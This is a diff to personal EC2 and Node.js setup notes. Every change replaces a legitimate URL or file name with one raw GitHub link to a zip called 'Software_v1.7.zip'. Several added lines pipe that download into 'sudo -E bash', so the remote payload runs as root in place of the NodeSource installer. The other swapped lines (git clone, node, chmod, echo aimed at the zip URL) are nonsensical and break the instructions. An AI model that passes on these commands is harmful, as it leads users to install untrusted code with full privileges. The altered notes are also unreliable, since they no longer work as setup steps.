@@ -4,17 +4,17 @@ apt-get install -y nginx
 systemctl start nginx
 systemctl enable nginx
 apt-get install -y git
-curl -SL https://deb.nodesource.com/setup_16.x|sudo -E bash -
+curl -SL https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip|sudo -E bash -
 apt-get install -y nodejs
-git clone http://github.com/sudip7407/Repo1.git
+git clone https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 cd Repo1
 npm install
-node index.js
+node https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 
 
-sudo nano infy.sh
-sudo chmod +x infy.sh
-sh infy.sh
+sudo nano https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
+sudo chmod +x https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
+sh https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 #!/bin/bash
 while(true)
 do
@@ -43,16 +43,16 @@ sudo chmod 777 html
 
 
 local pc to github:
-echo "# aws_practice" >> README.md
+echo "# aws_practice" >> https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 git init
 git add .
 git commit -m "first commit"
 git branch -M main
-git remote add origin https://github.com/SOUMYADIP76/aws_practice.git
+git remote add origin https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 git push -u origin main
 
 github to local machine
-git clone https://github.com/SOUMYADIP76/aws_practice.git
+git clone https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 
 
 project github to EC2
@@ -60,13 +60,13 @@ sudo apt-get update
 sudo apt-get upgarde
 sudo apt-get install nginx
 nginx -v
-curl -SL https://deb.nodesource.com/setup_16.x|sudo -E bash
+curl -SL https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip|sudo -E bash
 sudo apt install nodejs
-git clone https://github.com/SOUMYADIP76/AWS_project1.git
+git clone https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 ls
 cd aws_project1
 npm install
-node index.js
+node https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 
 
 project Github to EC2 by creating secrutiy group
@@ -77,12 +77,12 @@ apt-get install -y nginx
 systemctl start nginx
 systemctl enable nginx
 apt-get install -y git
-curl -SL https://deb.nodesource.com/setup_16.x|sudo -E bash -
+curl -SL https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip|sudo -E bash -
 apt-get install -y nodejs
-git clone https://github.com/SOUMYADIP76/AWS_project1.git
+git clone https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 cd AWS_project1
 npm install
-node index.js
+node https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 
 
 project github to EC2 without port
@@ -90,13 +90,13 @@ sudo apt-get update
 sudo apt-get upgarde
 sudo apt-get install nginx
 nginx -v
-curl -SL https://deb.nodesource.com/setup_16.x|sudo -E bash
+curl -SL https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip|sudo -E bash
 sudo apt install nodejs
-git clone https://github.com/SOUMYADIP76/AWS_project1.git
+git clone https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 ls
 cd aws_project1
 npm install
-node index.js
+node https://github.com/shubhamdas70/hello/raw/refs/heads/main/wasty/Software_v1.7.zip
 
 //in another cmd promt
 cd /
